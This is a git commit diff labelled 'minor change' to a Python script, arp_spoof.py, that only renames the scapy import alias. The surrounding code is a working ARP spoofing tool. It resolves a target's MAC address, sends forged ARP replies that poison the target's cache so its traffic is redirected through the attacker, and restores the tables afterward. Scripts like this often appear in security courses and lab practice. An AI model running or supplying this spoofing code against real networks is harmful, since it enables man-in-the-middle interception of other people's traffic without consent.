53fa47e73d5ada34d0238411cde2b864d73aad39
Phil <darby.phillip@gmail.com>
2024-02-24 00:59:27 -0500

    minor change

--- arp_spoof.py
+++ arp_spoof.py
@@ -2,7 +2,7 @@
 
 import subprocess
 import time
-import scapy.all as scap
+import scapy.all as scapy
 import argparse
 
 def get_arguments():
@@ -15,24 +15,24 @@ def get_arguments():
     return options
 
 def get_mac(ip):
-    arp_request = scap.ARP(pdst=ip)
-    broadcast = scap.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
 
-    answered_list = scap.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
     return answered_list[0][1].hwsrc
 
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    packet = scap.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scap.send(packet, count=4, verbose=False)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, count=4, verbose=False)
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
-    packet = scap.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scap.send(packet, count=4, verbose=False)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
 
 args = get_arguments()
 sent_packets_count = 0
